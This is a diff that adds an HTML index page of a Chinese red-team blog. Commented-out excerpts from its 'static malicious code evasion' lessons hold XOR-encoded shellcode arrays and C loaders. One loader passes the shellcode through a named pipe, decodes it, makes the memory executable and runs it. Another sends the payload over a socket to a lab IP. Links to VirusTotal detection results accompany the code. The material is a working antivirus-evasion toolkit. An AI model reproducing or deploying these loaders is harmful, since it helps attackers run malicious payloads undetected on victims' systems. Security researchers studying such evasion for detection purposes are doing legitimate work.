b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="n">argv</span><span class="p">[]){</span>
+    <span class="n">DWORD</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">sockVersion</span> <span class="o">=</span> <span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="n">WSADATA</span> <span class="n">wsaData</span><span class="p">;</span>
+    <span class="n">SOCKET</span> <span class="n">socks</span><span class="p">;</span>
+    <span class="n">SHORT</span> <span class="n">sListenPort</span> <span class="o">=</span> <span class="mi">8888</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">WSAStartup</span><span class="p">(</span><span class="n">sockVersion</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wsaData</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*]WSAStarup Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">socks</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">socks</span> <span class="o">==</span> <span class="n">INVALID_SOCKET</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*]Socket Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">sListenPort</span><span class="p">);</span>
+    <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">S_un</span><span class="p">.</span><span class="n">S_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"192.168.170.1"</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">socks</span><span class="p">,(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*]Bind Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">socks</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Send %d-Bytes </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">ret</span><span class="p">);</span>
+        <span class="n">closesocket</span><span class="p">(</span><span class="n">socks</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">WSACleanup</span><span class="p">();</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2d0a51fabe7fa9a5372069a0dd0a7c64.png" alt="2019-11-10-02-10-48" /></p>
+
+<p>https://www.virustotal.com/gui/file/15097ce3f38d81a1e8c6b6d5b7fe5fb7965bfc09a6ec6a0f54280036e3820c66/detection</p>
+
+-->
+          <!---->
+          来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。
+          <p>
+            <a class="post-link" href="/archivers/2019-11-10/5">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2019-11-10/4">静态恶意代码逃逸（第四课）</a>
+        </h2>
+        
+        <div class="post-meta">Nov 10, 2019</div>
+
+        <div class="post-excerpt">
+          <!--<h2 id="0x01-分离免杀">0x01 分离免杀</h2>
+
+<p>前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode</p>
+
+<p>分离免杀：将恶意代码放置在程序本身之外的一种加载方式。</p>
+
+<p>前面三课主要围绕着程序本身的加载，后面的课程将围绕网络、数据共享的方式去展开</p>
+
+<h2 id="0x02-管道">0x02 管道</h2>
+
+<p>何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</p>
+
+<p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。</p>
+
+<p>先展开本地管道来讲解：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;intrin.h&gt;
+</span>
+<span class="cp">#define BUFF_SIZE 1024
+</span><span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a</span><span class="s">"</span><span class="p">;</span>
+<span class="n">PTCHAR</span> <span class="n">ptsPipeName</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">pipe</span><span class="se">\\</span><span class="s">BadCodeTest"</span><span class="p">);</span>
+
+<span class="n">BOOL</span> <span class="nf">RecvShellcode</span><span class="p">(</span><span class="n">VOID</span><span class="p">){</span>
+    <span class="n">HANDLE</span> <span class="n">hPipeClient</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwWritten</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwShellcodeSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+    <span class="c1">// 等待管道可用</span>
+    <span class="n">WaitNamedPipe</span><span class="p">(</span><span class="n">ptsPipeName</span><span class="p">,</span><span class="n">NMPWAIT_WAIT_FOREVER</span><span class="p">);</span>
+    <span class="c1">// 连接管道</span>
+    <span class="n">hPipeClient</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">ptsPipeName</span><span class="p">,</span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="n">FILE_SHARE_READ</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">OPEN_EXISTING</span> <span class="p">,</span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">hPipeClient</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Can't Open Pipe , Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">WriteFile</span><span class="p">(</span><span class="n">hPipeClient</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">dwShellcodeSize</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwWritten</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">dwWritten</span> <span class="o">==</span> <span class="n">dwShellcodeSize</span><span class="p">){</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipeClient</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Send Success ! Shellcode : %d Bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwShellcodeSize</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipeClient</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+
+    <span class="n">HANDLE</span> <span class="n">hPipe</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="n">CHAR</span> <span class="n">szBuffer</span><span class="p">[</span><span class="n">BUFF_SIZE</span><span class="p">];</span>
+    <span class="n">DWORD</span> <span class="n">dwLen</span><span class="p">;</span>
+    <span class="n">PCHAR</span> <span class="n">pszShellcode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span> <span class="c1">// 内存页属性</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span>
+    <span class="c1">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span>
+    <span class="n">hPipe</span> <span class="o">=</span> <span class="n">CreateNamedPipe</span><span class="p">(</span>
+        <span class="n">ptsPipeName</span><span class="p">,</span>
+        <span class="n">PIPE_ACCESS_INBOUND</span><span class="p">,</span>
+        <span class="n">PIPE_TYPE_BYTE</span><span class="o">|</span> <span class="n">PIPE_WAIT</span><span class="p">,</span>
+        <span class="n">PIPE_UNLIMITED_INSTANCES</span><span class="p">,</span>
+        <span class="n">BUFF_SIZE</span><span class="p">,</span>
+        <span class="n">BUFF_SIZE</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">hPipe</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">){</span>
+        <span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-]Create Pipe Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">RecvShellcode</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">ConnectNamedPipe</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span><span class="nb">NULL</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Client Connected...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">ReadFile</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span><span class="n">szBuffer</span><span class="p">,</span><span class="n">BUFF_SIZE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwLen</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Get DATA Length : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwLen</span><span class="p">);</span>
+        <span class="c1">// 申请内存页</span>
+        <span class="n">pszShellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="n">dwLen</span><span class="p">,</span><span class="n">MEM_COMMIT</span><span class="p">,</span><span class="n">PAGE_READWRITE</span><span class="p">);</span>
+        <span class="c1">// 拷贝内存</span>
+        <span class="n">CopyMemory</span><span class="p">(</span><span class="n">pszShellcode</span><span class="p">,</span><span class="n">szBuffer</span><span class="p">,</span><span class="n">dwLen</span><span class="p">);</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span> <span class="n">dwLen</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+            <span class="n">Sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span>
+            <span class="n">_InterlockedXor8</span><span class="p">(</span><span class="n">pszShellcode</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 这里开始更改它的属性为可执行</span>
+        <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">pszShellcode</span><span class="p">,</span><span class="n">dwLen</span><span class="p">,</span><span class="n">PAGE_EXECUTE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">);</span>
+        <span class="c1">// 执行Shellcode</span>
+        <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+            <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">pszShellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+            <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+        <span class="p">);</span>
+
+        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="n">INFINITE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>本实例主要是通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1ed920c9e8e20b5e0ce01726dd9f616c.png" alt="2019-11-10-02-07-41" /></p>
+
+<p>V站结果：https://www.virustotal.com/gui/file/b81f3d2e6b72f908c861b0b6e1f504af33ef60825b36af3d21bfe90fce160ae4/detection</p>
+
+-->
+          <!---->
+          来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。
+          <p>
+            <a class="post-link" href="/archivers/2019-11-10/4">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+  </ul>
+  
+  <!-- Pagination links -->
+<div class="pagination">
+  
+    <a href="/page5" class="previous">PREV</a>
+  
+  <span class="page_number ">6 of 34</span>
+  
+    <a href="/page7" class="next">NEXT</a>
+  
+</div>
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
